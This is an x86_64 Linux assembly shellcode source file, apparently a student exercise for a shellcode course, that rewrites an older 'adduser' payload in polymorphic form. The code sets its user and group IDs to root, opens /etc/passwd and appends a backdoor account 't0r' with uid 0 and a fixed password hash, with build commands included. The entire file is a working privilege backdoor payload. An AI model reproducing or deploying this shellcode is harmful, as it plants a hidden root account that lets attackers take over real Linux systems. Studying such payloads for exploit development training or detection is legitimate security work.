; Original Author Information:
; sc_adduser01.S
; Arch:          x86_64, Linux
;
; Author:        0_o -- null_null
;            nu11.nu11 [at] yahoo.com
; Date:          2012-03-05
;
; compile an executable: nasm -f elf64 sc_adduser.S
;           ld -o sc_adduser sc_adduser.o
; compile an object: nasm -o sc_adduser_obj sc_adduser.S
;
; Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
; executed syscalls:     setreuid, setregid, open, write, close, exit
; Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
; syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
;
; shellcode-801-poly.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 8, 2016
;


global _start

section .text

_start:

        ;sys_setreuid(uint ruid, uint euid)
        
        push    0x1
	pop     rax
	dec     rax
        mov     al, 113                      ;syscall sys_setreuid
        xor     rdi, rdi                     ;arg 1 -- set real uid to root
        mov     rsi, rdi                     ;arg 2 -- set effective uid to root
        syscall

        ;sys_setregid(uint rgid, uint egid)
        
        xor     rdi, rdi                     ;arg 1 -- set real uid to root
        mul     rdi
        mov     al,  114                     ;syscall sys_setregid
        push    0x1
	pop     rsi
        dec     rsi                          ;arg 2 -- set effective uid to root
        syscall
    
        ;push all strings on the stack prior to file operations.
        
        push    0x2
	pop     rbx
	dec     rbx
	dec     rbx
        mov     ebx, 0x647773FF
        shr     rbx, 8
        push    rbx                             ;string \00dws
        mov     rbx, 0x7361702f6374652f
        push    rbx                             ;string sap/cte/
        mov     rbx, 0x0A687361622F6EFF
        shr     rbx, 8
        push    rbx                             ;string \00\nhsab/n
        mov     rbx, 0x69622F3A746F6F72
        push    rbx                             ;string ib/:toor
        mov     rbx, 0x2F3A3A303A303A67
        push    rbx                             ;string /::0:0:g
        mov     rbx, 0x46556B554B587435
        push    rbx                             ;string FUkUKXt5
        mov     rbx, 0x546755333A723074
        push    rbx                             ;string TgU3:r0t
    
        ;prelude to doing anything useful...
         
        mov     rbx, rsp           ;save stack pointer for later use
        push    rbp                ;store base pointer to stack so it can be restored later
        mov     rbp, rsp           ;set base pointer to current stack pointer
    
        ;sys_open(char* fname, int flags, int mode)
        
        sub     rsp, 16
        mov     [rbp - 16], rbx     ;store pointer to "t0r..../bash"
        mov     si, 0x0401          ;arg 2 -- flags
        mov     rdi, rbx
        add     rdi, 40            ;arg 1 -- pointer to "/etc/passwd"
        xor     rax, rax
        mov     al, 2              ;syscall sys_open
        syscall
    
        ;sys_write(uint fd, char* buf, uint size)
       
        mov     [rbp - 4], eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
        mov     rcx, rbx           ;arg 2 -- load rcx with pointer to string "t0r.../bash"
        xor     rdx, rdx
        mov     dl,  39            ;arg 3 -- load rdx with size of string "t0r.../bash\00"
        mov     rsi, rcx           ;arg 2 -- move to source index register
        mov     rdi, rax           ;arg 1 -- move to destination index register
        xor     rax, rax
        mov     al,  1             ;syscall sys_write
        syscall
    

        ;sys_close(uint fd)
        
        xor     rdi, rdi
        mov     edi, [rbp - 4]     ;arg 1 -- load stored file descriptor to destination index register
        xor     rax, rax
        mov     al,  3             ;syscall sys_close
        syscall
    
        ;sys_exit(int err_code)
    
        xor     rax, rax
        mov     al,  60          ;syscall sys_exit
        xor     rbx, rbx         ;arg 1 -- error code
        syscall
